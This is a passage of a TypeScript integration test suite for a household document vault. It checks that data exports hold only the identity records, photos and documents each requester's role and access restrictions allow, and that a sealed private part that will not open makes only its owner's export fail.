            expect(kids.only_me).toBeUndefined();
            expect(x.entries.get('index.html')?.toString()).toContain(
              'ID numbers and hidden details of other people are not in this export',
            );
          }
          if (want.includes('Tess') && role !== 'teen') {
            expect(x.entries.get(file('Tess'))?.toString()).toContain('TEEN-PLACE');
          }
          // One's own, both parts, with a section of index.html.
          const own = { owner: 'Mansoor', adult: 'Tariq', teen: 'Tess', viewer: 'Vik' }[role];
          const mine = JSON.parse(x.entries.get(file(own))?.toString() ?? '{}') as {
            shared: { masked?: string[] };
            only_me?: unknown;
          };
          expect(mine.shared.masked, `${audience}/${role}`).toBeUndefined();
          expect(Boolean(mine.only_me), `${audience}/${role}`).toBe(
            role === 'owner' || role === 'adult',
          );
          expect(x.entries.get('index.html')?.toString()).toContain(`<h3>${own} (you)</h3>`);
          // A document an ID is on that the requester may not see is not named.
          if (role === 'owner') {
            const ownRecord = JSON.parse(x.entries.get(file('Mansoor'))?.toString() ?? '{}') as {
              shared: { fields: IdentityFields };
            };
            expect(ownRecord.shared.fields.ids?.[0]).toEqual({
              id: 'o1',
              kind: 'passport',
              number: 'OWNER-PASS-1',
            });
          }
        }
      }
      // A widening whose notice has run out is in effect (identity_audience_now()).
      await admin.query('update household set identity_audience = $1 where id = $2', [
        'owners_and_self',
        hh,
      ]);
      await admin.query(
        `insert into notice_request (household_id, kind, subject, requested_by, requested_at, notice_until)
         values ($1, 'identity_audience', 'adults', $2, now() - interval '4 days', now() - interval '1 day')`,
        [hh, ownerAccount],
      );
      const due = await exported(adult.account as string);
      expect(identityFiles(due)).toEqual(everyone.map(file).sort());
      // One still waiting is not.
      await admin.query(
        "update notice_request set notice_until = now() + interval '1 day' where household_id = $1",
        [hh],
      );
      const waiting = await exported(adult.account as string);
      expect(identityFiles(waiting)).toEqual([file('Tariq')]);
    } finally {
      await admin.query('delete from notice_request where household_id = $1', [hh]);
      await admin.query('update household set identity_audience = $1 where id = $2', [
        'owners_and_self',
        hh,
      ]);
    }
  }, 180_000);

  it("nobody else's Only me part is even opened: one that will not open fails no other export", async () => {
    await admin.query('delete from member_identity');
    const tess = await person('Tess Sealed', 'teen');
    await putIdentity(tess.id, { shared: { given_name: 'Tess' } });
    // Her Only me part, sealed for somebody else: it does not open as hers.
    await withSystem(db, hh, async (trx) => {
      const key = await keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: tess.id });
      await trx
        .insertInto('member_identity')
        .values({
          household_id: hh,
          member_id: tess.id,
          part: 'only_me',
          ...sealIdentity(
            key.key,
            { householdId: hh, memberId: ownerMember, part: 'only_me' },
            { notes: 'x' },
          ),
          wrapped_by_scope: key.id,
        })
        .execute();
    });
    const mine = await exported(ownerAccount);
    expect(identityFiles(mine)).toEqual(['identity/Tess Sealed.json']);
    // Hers is opened, for her, and does not open.
    const exportId = await withSystem(db, hh, (trx) =>
      trx
        .insertInto('export')
        .values({ household_id: hh, requested_by: tess.account as string })
        .returning('id')
        .executeTakeFirstOrThrow(),
    ).then((r) => r.id);
    await buildExport(
      {
        db,
        keys,
        credentialsKey: deriveKey(MASTER, 'vault-credentials'),
        localRoot: vaultDir,
        log: () => undefined,
      },
      { household_id: hh, export_id: exportId },
    );
    const row = await withSystem(db, hh, (trx) =>
      trx.selectFrom('export').selectAll().where('id', '=', exportId).executeTakeFirstOrThrow(),
    );
    expect(row.state).toBe('failed');
    await admin.query('delete from member_identity where member_id = $1', [tess.id]);
  }, 60_000);

  it('the export holds only the photos and records the requester may read', async () => {
    await admin.query('delete from member_identity');
    const teen = await person('Teen Photo', 'teen');
    const viewer = await person('Viewer Photo', 'viewer');
    const child = await person('Child Photo', null);
    const jpeg = (who: string) =>
      Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.from(`PHOTO-OF-${who}`)]);
    await putPhoto(ownerMember, jpeg('OWNER'));
    await putPhoto(teen.id, jpeg('TEEN'));
    await putPhoto(viewer.id, jpeg('VIEWER'));
    await putPhoto(child.id, jpeg('CHILD'));
    await putIdentity(child.id, { shared: { given_name: 'Child' } });
    await putIdentity(viewer.id, { shared: { given_name: 'Viewer' } });
    const photos = (x: Awaited<ReturnType<typeof exported>>) =>
      [...x.entries.keys()].filter((n) => n.startsWith('people/')).sort();

    // An owner, and a teen (family.details): every photo; each the person's own.
    for (const account of [ownerAccount, teen.account as string]) {
      const x = await exported(account);
      expect(photos(x)).toEqual(
        ['Child Photo', 'Mansoor', 'Teen Photo', 'Viewer Photo'].map((n) => `people/${n}.jpg`),
      );
      expect(x.entries.get('people/Child Photo.jpg')).toEqual(jpeg('CHILD'));
      const index = x.index as unknown as Index;
      expect(index.people.find((p) => p.id === teen.id)?.photo).toBe('people/Teen Photo.jpg');
      expect(x.entries.get('index.html')?.toString()).toContain(
        '<img src="people/Child Photo.jpg" alt="" width="96" height="96"><span>Child Photo</span>',
      );
    }
    // The teen reads no record but their own (none) under the narrowest audience.
    expect(identityFiles(await exported(teen.account as string))).toEqual([]);

    // A viewer: their own photo and record, and nobody else's.
    const v = await exported(viewer.account as string);
    expect(photos(v)).toEqual(['people/Viewer Photo.jpg']);
    expect(identityFiles(v)).toEqual(['identity/Viewer Photo.json']);
    for (const other of ['OWNER', 'TEEN', 'CHILD']) {
      expect(v.all.includes(Buffer.from(`PHOTO-OF-${other}`)), other).toBe(false);
    }
    const index = v.index as unknown as Index;
    // Everybody is named, as the app names them to a viewer; only their own has more.
    expect(index.people.filter((p) => p.photo || p.identity).map((p) => p.name)).toEqual([
      'Viewer Photo',
    ]);
    expect(index.people.map((p) => p.name)).toContain('Child Photo');
  }, 120_000);

  it("a restricted requester's export is read as them: only what their restriction gives (5.32)", async () => {
    // Sana, an adult since the sealed notes' test, with a restriction left
    // on her that grants nothing (her sign-in given back as an adult, say):
    // it fails closed, and so does her export.
    const sana = await admin.query<{ id: string }>(
      "select id from account where email = 's@x.test'",
    );
    const sanaAccount = sana.rows[0]?.id as string;
    const titles = async () =>
      (await exported(sanaAccount)).index.documents.map((d) => d.title).sort();
    expect(await titles()).toContain("Mansoor's passport");
    await admin.query('insert into access_restriction (member_id, household_id) values ($1, $2)', [
      otherMember,
      hh,
    ]);
    try {
      const after = await titles();
      // Her own, within the ceiling: no Adults only one, since none is allowed.
      const own = await admin.query<{ title: string }>(
        `select title from document
          where owner_member_id = $1 and deleted_at is null and visibility <> 'adults'`,
        [otherMember],
      );
      expect(after).toEqual(own.rows.map((r) => r.title).sort());
      expect(after).not.toContain("Mansoor's passport");
      expect(after.length).toBeGreaterThan(0);
    } finally {
      await admin.query('delete from access_restriction where member_id = $1', [otherMember]);
    }
  }, 60_000);

  it("a restricted requester's export reads identity details as them: their own only (the 5.32 review)", async () => {
    // Rita, an adult with a restriction left on her (an operator's hand: no
    // route gives an adult one), given the owner's documents; the household
    // lets adults read one another's shared identity details.
    const rita = await person('Rita', 'adult');
    await putIdentity(ownerMember, { shared: { given_name: 'Mansoor' } });
    await admin.query(`update household set identity_audience = 'adults' where id = $1`, [hh]);
    try {
      // Unrestricted, an adult's export holds the owner's shared record.
      expect(identityFiles(await exported(rita.account as string))).toContain(
        'identity/Mansoor.json',
      );
      await admin.query(
        `insert into access_restriction (member_id, household_id, limits_people)
         values ($1, $2, true)`,
        [rita.id, hh],
      );
      await admin.query(
        `insert into access_restriction_member (restricted_member_id, household_id, member_id)
         values ($1, $2, $3)`,
        [rita.id, hh, ownerMember],
      );
      // Restricted, it is read as her: identity details her own only, even of
      // somebody whose documents she is given.
      const x = await exported(rita.account as string);
      expect(identityFiles(x)).toEqual([]);
      expect(x.all.includes(Buffer.from('"given_name": "Mansoor"'))).toBe(false);
    } finally {
      await admin.query('delete from access_restriction where member_id = $1', [rita.id]);
      await admin.query(
        `update household set identity_audience = 'owners_and_self' where id = $1`,
        [hh],
      );
    }
  }, 60_000);
});
